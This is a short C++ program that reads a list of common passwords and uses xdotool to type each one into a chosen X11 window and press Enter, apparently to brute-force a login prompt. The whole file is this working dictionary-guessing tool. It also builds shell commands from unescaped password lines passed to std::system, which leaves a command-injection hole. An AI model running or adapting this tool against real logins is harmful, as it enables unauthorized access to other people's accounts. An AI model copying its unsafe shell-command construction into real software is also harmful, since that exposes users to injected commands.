//This program uses xdotool to input text. You will need a system with x11 & xdotool for this to work.
//To get the id for the window you want to input text into, enter "xdotool selectwindow", then click on the desired window.

#include <fstream>
#include <cstdlib>
#include <iostream>

    std::ifstream passDB("common-passwords.txt");
    std::string temp;
    int windowID = 0;

int main(){
    std::cout << "Enter window ID : ";
    std::cin >> windowID;
    

    while (std::getline(passDB, temp)){
        std::system(("xdotool type --window " + std::to_string(windowID) + ' ' + temp).c_str());
        std::system(("xdotool key --window " + std::to_string(windowID) + " KP_Enter").c_str());
    }
}